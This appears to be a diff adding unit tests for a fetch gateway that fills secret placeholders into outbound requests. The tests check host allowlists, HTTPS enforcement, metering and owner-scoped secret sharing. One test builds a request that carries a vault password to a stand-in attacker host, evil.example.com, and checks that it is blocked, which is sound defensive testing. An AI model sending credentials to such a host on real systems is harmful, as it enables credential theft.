+		const schemePrefixed = await expandSecretPlaceholders({
+			request: schemePrefixedRequest,
+			props,
+			env,
+		})
+		expect(schemePrefixed.headers.get('Authorization')).toBe(
+			`Basic ${btoa('client-id:client-secret')}`,
+		)
+
+		resolveSpy.mockImplementation(async ({ name }) => ({
+			found: name === 'paypalClientId',
+			value: name === 'paypalClientId' ? 'client-id' : null,
+			scope: name === 'paypalClientId' ? 'user' : null,
+			allowedHosts: name === 'paypalClientId' ? ['api-m.paypal.com'] : [],
+		}))
+		const missingSecretRequest = new Request(
+			'https://api-m.paypal.com/v1/oauth2/token',
+			{
+				headers: { Authorization: placeholder },
+			},
+		)
+		await expect(
+			expandSecretPlaceholders({ request: missingSecretRequest, props, env }),
+		).rejects.toThrow('Secret "paypalClientSecret" was not found.')
+
+		for (const blockedSecretName of ['paypalClientId', 'paypalClientSecret']) {
+			const allowedHosts =
+				blockedSecretName === 'paypalClientId'
+					? { paypalClientId: [], paypalClientSecret: ['api-m.paypal.com'] }
+					: { paypalClientId: ['api-m.paypal.com'], paypalClientSecret: [] }
+			resolveSpy.mockImplementation(async ({ name }) => {
+				const values: Record<string, string> = {
+					paypalClientId: 'client-id',
+					paypalClientSecret: 'client-secret',
+				}
+				return {
+					found: name in values,
+					value: values[name] ?? null,
+					scope: name in values ? 'user' : null,
+					allowedHosts: allowedHosts[name as keyof typeof allowedHosts] ?? [],
+				}
+			})
+			const blockedRequest = new Request(
+				'https://api-m.paypal.com/v1/oauth2/token',
+				{
+					headers: { Authorization: placeholder },
+				},
+			)
+			await expect(
+				expandSecretPlaceholders({ request: blockedRequest, props, env }),
+			).rejects.toSatisfy((error: unknown) => {
+				const approvals = parseHostApprovalRequiredBatchMessage(
+					getErrorMessage(error),
+				)
+				return (
+					approvals?.entries[0]?.secretName === blockedSecretName &&
+					approvals?.entries[0]?.host === 'api-m.paypal.com'
+				)
+			})
+		}
+	} finally {
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway resolves path-only URLs against baseUrl', async () => {
+	// Node's Request rejects path-only URLs; workerd allows them for kody outbound fetch.
+	const createPathOnlyRequest = (url: string) =>
+		({
+			url,
+			method: 'GET',
+			headers: new Headers(),
+			redirect: 'follow',
+			credentials: 'same-origin',
+			mode: 'cors',
+			cache: 'default',
+			integrity: '',
+			keepalive: false,
+			signal: undefined,
+			text: async () => '',
+		}) as unknown as Request
+
+	const root = await expandSecretPlaceholders({
+		request: createPathOnlyRequest('/'),
+		props,
+		env,
+	})
+	expect(root.url).toBe('https://example.com/')
+
+	const nested = await expandSecretPlaceholders({
+		request: createPathOnlyRequest('/core/log'),
+		props,
+		env,
+	})
+	expect(nested.url).toBe('https://example.com/core/log')
+})
+
+test('outbound requests get a default User-Agent; caller values win', async () => {
+	// GitHub rejects UA-less requests with an opaque 403, and workerd sends
+	// no UA by default. Pin presence/override, not the default string value.
+	const bare = await expandSecretPlaceholders({
+		request: new Request('https://api.github.com/user'),
+		props,
+		env,
+	})
+	expect(bare.headers.get('user-agent')).toBeTruthy()
+
+	const custom = await expandSecretPlaceholders({
+		request: new Request('https://api.github.com/user', {
+			headers: { 'User-Agent': 'my-package/2.0' },
+		}),
+		props,
+		env,
+	})
+	expect(custom.headers.get('user-agent')).toBe('my-package/2.0')
+
+	const modeOff = await expandSecretPlaceholders({
+		request: new Request('https://api.github.com/user', {
+			headers: { 'x-kody-secret-resolution': 'off' },
+		}),
+		props,
+		env,
+	})
+	expect(modeOff.headers.get('user-agent')).toBeTruthy()
+})
+
+test('gateway fetch records outbound_fetch usage metering', async () => {
+	const usageModule = await import('#worker/usage/record-usage.ts')
+	const recordUsageSpy = vi
+		.spyOn(usageModule, 'recordUsage')
+		.mockResolvedValue(undefined)
+	const fetchStub = vi.fn()
+	const waitUntil = vi.fn()
+
+	try {
+		fetchStub.mockResolvedValue(
+			new Response('ok', {
+				status: 200,
+				headers: { 'content-length': '1234' },
+			}),
+		)
+		const successResponse = await executeGatewayFetch({
+			env,
+			props,
+			request: new Request('https://api.example.com/data'),
+			globalFetch: fetchStub,
+			waitUntil,
+		})
+		expect(successResponse.status).toBe(200)
+		expect(fetchStub).toHaveBeenCalledTimes(1)
+		// waitUntil: usage metering only
+		expect(waitUntil).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledWith(env, {
+			userId: 'user-123',
+			eventType: 'outbound_fetch',
+			entityId: 'api.example.com',
+			durationMs: expect.any(Number),
+			bytes: 1234,
+			outcome: 'success',
+		})
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		fetchStub.mockResolvedValue(new Response('upstream error', { status: 502 }))
+		const upstreamErrorResponse = await executeGatewayFetch({
+			env,
+			props,
+			request: new Request('https://api.example.com/upstream-error'),
+			globalFetch: fetchStub,
+			waitUntil,
+		})
+		expect(upstreamErrorResponse.status).toBe(502)
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledWith(
+			env,
+			expect.objectContaining({
+				userId: 'user-123',
+				eventType: 'outbound_fetch',
+				entityId: 'api.example.com',
+				outcome: 'success',
+			}),
+		)
+		expect(recordUsageSpy.mock.calls[0]?.[1]?.bytes).toBeUndefined()
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		fetchStub.mockResolvedValue(new Response('ok', { status: 200 }))
+		await executeGatewayFetch({
+			env,
+			props,
+			request: new Request('https://api.example.com/no-length'),
+			globalFetch: fetchStub,
+		})
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledWith(
+			env,
+			expect.objectContaining({
+				userId: 'user-123',
+				eventType: 'outbound_fetch',
+				entityId: 'api.example.com',
+				outcome: 'success',
+			}),
+		)
+		expect(recordUsageSpy.mock.calls[0]?.[1]?.bytes).toBeUndefined()
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		const fetchError = new Error('network failed')
+		fetchStub.mockRejectedValue(fetchError)
+		await expect(
+			executeGatewayFetch({
+				env,
+				props,
+				request: new Request('https://api.example.com/fail'),
+				globalFetch: fetchStub,
+			}),
+		).rejects.toThrow('network failed')
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledWith(
+			env,
+			expect.objectContaining({
+				userId: 'user-123',
+				eventType: 'outbound_fetch',
+				entityId: 'api.example.com',
+				outcome: 'error',
+			}),
+		)
+		expect(recordUsageSpy.mock.calls[0]?.[1]?.bytes).toBeUndefined()
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		await expect(
+			executeGatewayFetch({
+				env,
+				props: { ...props, baseUrl: '' },
+				request: new Request('https://original.example.com/api'),
+				globalFetch: fetchStub,
+			}),
+		).rejects.toThrow('Fetch gateway requires a non-empty baseUrl in props.')
+		expect(fetchStub).not.toHaveBeenCalled()
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledWith(
+			env,
+			expect.objectContaining({
+				userId: 'user-123',
+				eventType: 'outbound_fetch',
+				entityId: 'original.example.com',
+				outcome: 'error',
+			}),
+		)
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		// Error path with waitUntil available: metering is deferred, never blocks.
+		fetchStub.mockRejectedValue(new Error('network failed with waitUntil'))
+		await expect(
+			executeGatewayFetch({
+				env,
+				props,
+				request: new Request('https://api.example.com/fail-deferred'),
+				globalFetch: fetchStub,
+				waitUntil,
+			}),
+		).rejects.toThrow('network failed with waitUntil')
+		// waitUntil: usage metering only
+		expect(waitUntil).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy.mock.calls[0]?.[1]).toMatchObject({
+			entityId: 'api.example.com',
+			outcome: 'error',
+		})
+
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		waitUntil.mockClear()
+
+		fetchStub.mockResolvedValue(new Response('ok'))
+		await executeGatewayFetch({
+			env,
+			props: { ...props, userId: null },
+			request: new Request('https://api.example.com/anonymous'),
+			globalFetch: fetchStub,
+		})
+		expect(recordUsageSpy).not.toHaveBeenCalled()
+	} finally {
+		recordUsageSpy.mockRestore()
+	}
+})
+
+test('gateway fetch metering never derives a hostname from expanded secret placeholders', async () => {
+	const usageModule = await import('#worker/usage/record-usage.ts')
+	const recordUsageSpy = vi
+		.spyOn(usageModule, 'recordUsage')
+		.mockResolvedValue(undefined)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'resolved-secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+		})
+	// Node's Request rejects path-only URLs; workerd allows them for kody outbound fetch.
+	const createPathOnlyRequest = (url: string) =>
+		({
+			url,
+			method: 'GET',
+			headers: new Headers(),
+			redirect: 'follow',
+			credentials: 'same-origin',
+			mode: 'cors',
+			cache: 'default',
+			integrity: '',
+			keepalive: false,
+			signal: undefined,
+			text: async () => '',
+		}) as unknown as Request
+	const fetchStub = vi.fn(async () => new Response('ok'))
+
+	try {
+		// Path-only URL without placeholders: the transformed (baseUrl) host is
+		// literal and safe to meter.
+		await executeGatewayFetch({
+			env,
+			props,
+			request: createPathOnlyRequest('/api/status'),
+			globalFetch: fetchStub,
+		})
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy.mock.calls[0]?.[1]).toMatchObject({
+			entityId: 'example.com',
+			outcome: 'success',
+		})
+
+		// Unparseable original URL containing a placeholder: the expanded host
+		// could contain secret material, so no hostname is metered.
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		await executeGatewayFetch({
+			env,
+			props,
+			request: createPathOnlyRequest('/api?key={{secret:token}}'),
+			globalFetch: fetchStub,
+		})
+		expect(fetchStub).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy.mock.calls[0]?.[1]).toMatchObject({
+			entityId: '',
+			outcome: 'success',
+		})
+
+		// Path-only URL whose placeholder was percent-encoded the same way
+		// `Request.url` serializes `{` / `}` in pathnames.
+		recordUsageSpy.mockClear()
+		fetchStub.mockClear()
+		await executeGatewayFetch({
+			env,
+			props,
+			request: createPathOnlyRequest('/bot%7B%7Bsecret:token%7D%7D/getMe'),
+			globalFetch: fetchStub,
+		})
+		expect(fetchStub).toHaveBeenCalledTimes(1)
+		expect(fetchStub.mock.calls[0]?.[0]?.url).toBe(
+			'https://example.com/botresolved-secret-value/getMe',
+		)
+		expect(recordUsageSpy).toHaveBeenCalledTimes(1)
+		expect(recordUsageSpy.mock.calls[0]?.[1]).toMatchObject({
+			entityId: '',
+			outcome: 'success',
+		})
+	} finally {
+		recordUsageSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway aborts hung outbound fetches via timeoutMs or outboundFetchTimeoutMs props', async () => {
+	const createHungFetch = () =>
+		vi.fn((_request: Request) => {
+			return new Promise<Response>((_resolve, reject) => {
+				_request.signal.addEventListener(
+					'abort',
+					() => {
+						reject(
+							_request.signal.reason ??
+								new DOMException('The operation was aborted.', 'AbortError'),
+						)
+					},
+					{ once: true },
+				)
+			})
+		})
+	const isAbortOrTimeout = (error: unknown) => {
+		const name =
+			error && typeof error === 'object' && 'name' in error
+				? String(error.name)
+				: ''
+		return name === 'TimeoutError' || name === 'AbortError'
+	}
+
+	const explicitTimeout = createHungFetch()
+	const startedAtMs = Date.now()
+	await expect(
+		executeGatewayFetch({
+			env,
+			props,
+			request: new Request('https://example.com/slow'),
+			globalFetch: explicitTimeout as unknown as typeof fetch,
+			timeoutMs: 40,
+		}),
+	).rejects.toSatisfy(isAbortOrTimeout)
+	expect(Date.now() - startedAtMs).toBeLessThan(500)
+	expect(explicitTimeout).toHaveBeenCalledTimes(1)
+	expect(explicitTimeout.mock.calls[0]?.[0]?.signal.aborted).toBe(true)
+
+	const propsTimeout = createHungFetch()
+	await expect(
+		executeGatewayFetch({
+			env,
+			props: { ...props, outboundFetchTimeoutMs: 40 },
+			request: new Request('https://example.com/slow'),
+			globalFetch: propsTimeout as unknown as typeof fetch,
+		}),
+	).rejects.toSatisfy(isAbortOrTimeout)
+	expect(propsTimeout).toHaveBeenCalledTimes(1)
+	expect(propsTimeout.mock.calls[0]?.[0]?.signal.aborted).toBe(true)
+})
+
+test('fetch gateway expands provider placeholders and denies the wrong host without calling user secrets', async () => {
+	const createRequest = (host: string) =>
+		new Request(`https://${host}/login`, {
+			headers: {
+				Authorization:
+					'Bearer {{secret/1password:i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password}}',
+			},
+		})
+	const resolveSpy = vi
+		.spyOn(providerResolve, 'resolveProviderSecretForFetch')
+		.mockResolvedValue({
+			provider: '1password',
+			ref: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			canonicalRef: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			value: 'vault-password',
+			hosts: ['app.example.com'],
+		})
+	const userSecretSpy = vi.spyOn(secretService, 'resolveSecret')
+	try {
+		const allowed = await expandSecretPlaceholders({
+			request: createRequest('app.example.com'),
+			props,
+			env,
+		})
+		expect(allowed.headers.get('Authorization')).toBe('Bearer vault-password')
+		expect(resolveSpy).toHaveBeenCalledTimes(1)
+
+		await expect(
+			expandSecretPlaceholders({
+				request: createRequest('evil.example.com'),
+				props,
+				env,
+			}),
+		).rejects.toThrow('not allowed for host "evil.example.com"')
+		expect(userSecretSpy).not.toHaveBeenCalled()
+	} finally {
+		resolveSpy.mockRestore()
+		userSecretSpy.mockRestore()
+	}
+})
+
+test('fetch gateway replaces the original mixed-case provider placeholder after normalize', async () => {
+	const original =
+		'{{secret/1Password: i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password }}'
+	const resolveSpy = vi
+		.spyOn(providerResolve, 'resolveProviderSecretForFetch')
+		.mockResolvedValue({
+			provider: '1password',
+			ref: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			canonicalRef: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			value: 'vault-password',
+			hosts: ['app.example.com'],
+		})
+	try {
+		const allowed = await expandSecretPlaceholders({
+			request: new Request('https://app.example.com/login', {
+				headers: { Authorization: `Bearer ${original}` },
+			}),
+			props,
+			env,
+		})
+		expect(allowed.headers.get('Authorization')).toBe('Bearer vault-password')
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				provider: '1Password',
+				ref: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			}),
+		)
+	} finally {
+		resolveSpy.mockRestore()
+	}
+})
+
+test('fetch gateway rejects provider secrets on a non-HTTPS request URL', async () => {
+	const resolveSpy = vi
+		.spyOn(providerResolve, 'resolveProviderSecretForFetch')
+		.mockResolvedValue({
+			provider: '1password',
+			ref: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			canonicalRef: 'i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password',
+			value: 'vault-password',
+			hosts: ['app.example.com'],
+		})
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('http://app.example.com/login', {
+					headers: {
+						Authorization:
+							'Bearer {{secret/1password:i/cccccccc-cccc-4ccc-8ccc-cccccccccccc/password}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow(/HTTPS/)
+	} finally {
+		resolveSpy.mockRestore()
+	}
+})
+
+test('executeGatewayFetch rejects when allowOutboundFetch is false', async () => {
+	const usageModule = await import('#worker/usage/record-usage.ts')
+	const recordUsageSpy = vi
+		.spyOn(usageModule, 'recordUsage')
+		.mockResolvedValue(undefined)
+	const globalFetch = vi.fn(async () => new Response('ok'))
+	try {
+		await expect(
+			executeGatewayFetch({
+				env,
+				props: {
+					baseUrl: 'https://kody.example',
+					userId: 'user-123',
+					email: 'user@example.com',
+					storageContext: null,
+					allowOutboundFetch: false,
+				},
+				request: new Request('https://example.com'),
+				globalFetch: globalFetch as unknown as typeof fetch,
+			}),
+		).rejects.toThrow('Outbound fetch is not available in retriever runs.')
+		expect(globalFetch).not.toHaveBeenCalled()
+		expect(recordUsageSpy).not.toHaveBeenCalled()
+	} finally {
+		recordUsageSpy.mockRestore()
+	}
+})
+
+test('fetch gateway remaps share-grant secret resolution to the package owner', async () => {
+	const request = new Request('https://example.com/api', {
+		headers: {
+			Authorization: 'Bearer {{secret:ownerMountedToken|scope=user}}',
+			'x-kody-secret-authority': 'shared-pkg',
+		},
+	})
+	const guestProps = {
+		...props,
+		userId: 'guest-user',
+		storageContext: {
+			sessionId: null,
+			appId: 'shared-pkg',
+			packageId: 'shared-pkg',
+			storageId: 'shared-pkg',
+		},
+		grantedSecretAuthorityPackageIds: ['shared-pkg'],
+	}
+	const ownerSpy = vi
+		.spyOn(shareGrants, 'resolvePackageStorageOwnerUserId')
+		.mockResolvedValue('owner-user')
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'shared-pkg',
+			userId: 'owner-user',
+			kodyId: 'shared-tools',
+			name: '@owner/shared-tools',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-shared',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue(null)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'owner-secret-value',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: ['shared-pkg'],
+		})
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request,
+			props: guestProps,
+			env,
+		})
+		expect(ownerSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				callerUserId: 'guest-user',
+				packageId: 'shared-pkg',
+			}),
+		)
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'owner-user',
+				name: 'ownerMountedToken',
+				scope: 'user',
+			}),
+		)
+		expect(transformed.headers.get('Authorization')).toBe(
+			'Bearer owner-secret-value',
+		)
+	} finally {
+		ownerSpy.mockRestore()
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('share-grant guest: packageSecrets.get opaque ref expands as owner in fetch', async () => {
+	// Simulates guest packageSecrets.get(alias) → put ref in fetch Authorization.
+	// Mount resolve (owner stamp) returns name+scope only; fetch remaps via
+	// trusted package authority to the owner before resolveSecret.
+	const mountedRef = '{{secret:ownerNotesToken|scope=package}}'
+	const request = new Request('https://example.com/api/notes', {
+		headers: {
+			Authorization: `Bearer ${mountedRef}`,
+			'x-kody-secret-authority': 'shared-pkg',
+		},
+	})
+	const guestProps = {
+		...props,
+		userId: 'guest-user',
+		storageContext: {
+			sessionId: null,
+			appId: 'shared-pkg',
+			packageId: 'shared-pkg',
+			storageId: 'shared-pkg',
+		},
+		grantedSecretAuthorityPackageIds: ['shared-pkg'],
+	}
+	const ownerSpy = vi
+		.spyOn(shareGrants, 'resolvePackageStorageOwnerUserId')
+		.mockResolvedValue('owner-user')
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'shared-pkg',
+			userId: 'owner-user',
+			kodyId: 'shared-notes',
+			name: '@owner/shared-notes',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-shared',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue(null)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'owner-package-scoped-token',
+			scope: 'package',
+			allowedHosts: ['example.com'],
+			allowedPackages: ['shared-pkg'],
+		})
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request,
+			props: guestProps,
+			env,
+		})
+		expect(ownerSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				callerUserId: 'guest-user',
+				packageId: 'shared-pkg',
+			}),
+		)
+		expect(resolveSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'owner-user',
+				name: 'ownerNotesToken',
+				scope: 'package',
+			}),
+		)
+		// Guest must not resolve under their own id for the owner mount.
+		expect(resolveSpy).not.toHaveBeenCalledWith(
+			expect.objectContaining({ userId: 'guest-user' }),
+		)
+		expect(transformed.headers.get('Authorization')).toBe(
+			'Bearer owner-package-scoped-token',
+		)
+	} finally {
+		ownerSpy.mockRestore()
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('share-grant guest: secretHeaders.basic opaque refs expand as owner in fetch', async () => {
+	// packageSecrets.get(user) / get(pass) → secretHeaders.basic({…}) → fetch.
+	const basic = buildBasicAuthSecretPlaceholder({
+		usernameSecret: 'ownerClientId',
+		passwordSecret: 'ownerClientSecret',
+		scope: 'user',
+	})
+	const request = new Request('https://example.com/oauth/token', {
+		method: 'POST',
+		headers: {
+			Authorization: basic,
+			'x-kody-secret-authority': 'shared-pkg',
+		},
+	})
+	const guestProps = {
+		...props,
+		userId: 'guest-user',
+		storageContext: {
+			sessionId: null,
+			appId: 'shared-pkg',
+			packageId: 'shared-pkg',
+			storageId: 'shared-pkg',
+		},
+		grantedSecretAuthorityPackageIds: ['shared-pkg'],
+	}
+	const ownerSpy = vi
+		.spyOn(shareGrants, 'resolvePackageStorageOwnerUserId')
+		.mockResolvedValue('owner-user')
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'shared-pkg',
+			userId: 'owner-user',
+			kodyId: 'shared-oauth',
+			name: '@owner/shared-oauth',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-shared',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue(null)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockImplementation(async (input) => ({
+			found: true,
+			value:
+				input.name === 'ownerClientId'
+					? 'owner-client-id'
+					: 'owner-client-secret',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: ['shared-pkg'],
+		}))
+	try {
+		const transformed = await expandSecretPlaceholders({
+			request,
+			props: guestProps,
+			env,
+		})
+		expect(
+			resolveSpy.mock.calls.every((call) => call[0].userId === 'owner-user'),
+		).toBe(true)
+		const auth = transformed.headers.get('Authorization') ?? ''
+		expect(auth.startsWith('Basic ')).toBe(true)
+		expect(auth).not.toContain('{{secret')
+	} finally {
+		ownerSpy.mockRestore()
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
+
+test('share-grant guest: remapped user secret without allowed_packages is denied', async () => {
+	// Owner remap must not inherit implicit self-authored keychain access.
+	const request = new Request('https://example.com/api', {
+		headers: {
+			Authorization: 'Bearer {{secret:ownerPrivateKey|scope=user}}',
+			'x-kody-secret-authority': 'shared-pkg',
+		},
+	})
+	const guestProps = {
+		...props,
+		userId: 'guest-user',
+		storageContext: {
+			sessionId: null,
+			appId: 'shared-pkg',
+			packageId: 'shared-pkg',
+			storageId: 'shared-pkg',
+		},
+		grantedSecretAuthorityPackageIds: ['shared-pkg'],
+	}
+	const ownerSpy = vi
+		.spyOn(shareGrants, 'resolvePackageStorageOwnerUserId')
+		.mockResolvedValue('owner-user')
+	const packageSpy = vi
+		.spyOn(packageRepo, 'getSavedPackageById')
+		.mockResolvedValue({
+			id: 'shared-pkg',
+			userId: 'owner-user',
+			kodyId: 'shared-tools',
+			name: '@owner/shared-tools',
+			description: '',
+			tags: [],
+			searchText: null,
+			hasApp: false,
+			hidden: false,
+			isPrivate: false,
+			sourceId: 'source-shared',
+			createdAt: '2026-01-01T00:00:00.000Z',
+			updatedAt: '2026-01-01T00:00:00.000Z',
+		})
+	const forkSpy = vi
+		.spyOn(communityRepo, 'getCommunityForkByForkedPackageId')
+		.mockResolvedValue(null)
+	const resolveSpy = vi
+		.spyOn(secretService, 'resolveSecret')
+		.mockResolvedValue({
+			found: true,
+			value: 'should-not-leak',
+			scope: 'user',
+			allowedHosts: ['example.com'],
+			allowedPackages: [],
+		})
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request,
+				props: guestProps,
+				env,
+			}),
+		).rejects.toThrow()
+	} finally {
+		ownerSpy.mockRestore()
+		packageSpy.mockRestore()
+		forkSpy.mockRestore()
+		resolveSpy.mockRestore()
+	}
+})
